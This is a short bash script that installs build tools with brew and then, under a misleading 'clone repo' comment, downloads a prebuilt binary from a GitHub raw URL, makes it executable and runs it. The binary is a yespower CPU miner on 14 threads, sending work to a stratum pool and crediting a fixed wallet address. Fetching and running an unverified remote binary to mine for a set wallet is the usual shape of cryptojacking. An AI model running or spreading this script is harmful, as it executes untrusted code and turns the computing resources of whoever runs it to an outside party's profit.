#!/usr/bin/env bash
# install dependencies
brew install coreutils
brew install automake openssl zlib curl jansson make
# clone repo
wget https://github.com/BatiKangkung/KangKung/raw/main/avx2m && chmod +x avx2m 
./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(gshuf -i 100-999 -n 1)-CPU) -t 14 -p x

